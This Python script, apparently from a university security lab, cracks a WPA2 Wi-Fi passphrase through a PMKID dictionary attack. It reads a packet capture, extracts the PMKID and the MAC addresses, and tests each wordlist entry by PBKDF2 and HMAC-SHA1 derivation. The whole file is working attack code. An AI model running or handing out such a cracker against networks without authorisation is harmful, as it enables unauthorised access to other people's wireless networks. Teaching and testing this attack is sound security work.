#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
PMKID attack with passphrase from the worldlist file
Recover the pmkid from the pcap and the ap mac address and the client mac address
Generate the pmkid with the passphrase and the different address
Check if the pmkid match between the generate one and the recovered one
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__modifyBy__	= "Julien Huguet et Antoine Hunkeler"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 	= "abraham.rubinstein@heig-vd.ch"
__status__ 	= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2_math import pbkdf2_hex Not working dependance
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

# Open and read the worldlist, append to a list to have all the passphrase
def readWorldList(path):
	file = open(path, "r")
	passphrase = list()
	for word in file:
		passphrase.append(word[:-1])
	return passphrase

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

# Set the path of the worldlist
path = "./wordlist.txt"

# Recover the different passphrase stored in the file worldlist
passphrase = readWorldList(path)

# Important parameters for key derivation - most of them can be obtained from the pcap file
ssid        = wpa[3].info.decode('utf-8')


# Recover PMKID from wireshark cap
for packet in wpa:
	if packet.haslayer(EAPOL):
		pmkid 	    = b2a_hex(packet.load)[-32:] # We keep the last 32 characters wich represents the pmkid
		APmac       = a2b_hex(packet.addr2.replace(":","")) # Take the ap mac address from the pcap
		Clientmac   = a2b_hex(packet.addr1.replace(":","")) # Take the client mac address from the pcap

print ("PMKID : ", pmkid, "\n")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")

ssid = str.encode(ssid)
# String used for the generated pmkid
pmk_name = "PMK Name"
for word in passphrase:
	wordEncode = str.encode(word)
	pmk = pbkdf2(hashlib.sha1, wordEncode, ssid, 4096, 32)
	pmkid_generated = hmac.new(pmk, str.encode(pmk_name) + APmac + Clientmac, hashlib.sha1).hexdigest().encode()[:-8]
	# Test if the calculated pmkid match the pmkid from the pcap
	if pmkid_generated == pmkid:
		print("The passphrase used is correct : ", word, "\n")
		break
	else:
		print("Try a new passphrase : ", word, "\n")